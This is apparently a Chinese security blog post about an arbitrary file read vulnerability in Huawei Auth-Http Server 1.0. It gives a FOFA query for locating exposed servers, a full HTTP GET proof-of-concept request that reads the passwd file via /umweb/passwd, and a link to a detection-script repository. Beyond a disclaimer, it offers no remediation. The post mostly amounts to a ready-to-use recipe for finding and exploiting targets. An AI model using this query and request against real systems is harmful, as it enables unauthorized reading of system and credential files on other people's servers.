#  华为Auth-HTTP服务器任意文件读取漏洞   
安全透视镜  网络安全透视镜   2023-11-28 07:01  
  
# 一、漏洞描述  
  
  
华为Auth-Http Server 1.0存在任意文件读取，攻击者可通过该漏洞读取任意文件。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2sbTthHg7cmAECMkpkdaIKVDic11PkezDwWDSqMaTe8fBibxRTE6Ygayxg/640?wx_fmt=png&from=appmsg "")  
  
# 二、网络空间搜索引擎搜索  
  
  
fofa查询  
```
server="Huawei Auth-Http Server 1.0"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2sZSuMwRlLej4ickBfF9xl4mBfFsXCbIQVzDiciapPJh8YwNgPcVibTETbfA/640?wx_fmt=png&from=appmsg "")  
  
# 三、漏洞复现  
  
  
读取passwd文件 POC  
```
GET /umweb/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2scYMfnj53dz2EmK955DIufBIgDbUZ5F1r5fic7WYeibTdDAFAFcKjtZicQ/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2sUMo85ics6pwgXJuRJG6TBP6uRFTu63z5METbuzEwHFa9E2aN62KAXDw/640?wx_fmt=png&from=appmsg "")  
  
# 四、漏洞检测  
  
  
pocsuite3漏洞检测  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2steZD3TMswKSRWnDCG0JCOiaw9vmrAoDibYmp3jloDEib7ibTicDjK8nK0Lw/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞检测脚本已上传免费漏洞库  
  
地址：  
  
https://github.com/Vme18000yuan/FreePOC  
  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS5vmiaKJOXzjzMbKc83xYO2sNPJI0j9aq60LoBcp3ibURTZ0IhehnRjmnpSOeKDWZEpGzhcsCoPckSQ/640?wx_fmt=png&from=appmsg "")  
  
#   
# 免责声明：文章来源互联网收集整理，请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
****  
![](https://mmbiz.qpic.cn/mmbiz_png/apNprpz3YS51gqsJwIM82Y5RTicXUygDUxQ76EiavrIibm8L0BUzdF6veUR4dQOKJn2iaEFQlNeq0PIPSFXTibx0OZw/640?wx_fmt=png&from=appmsg "")  
  
****  
  
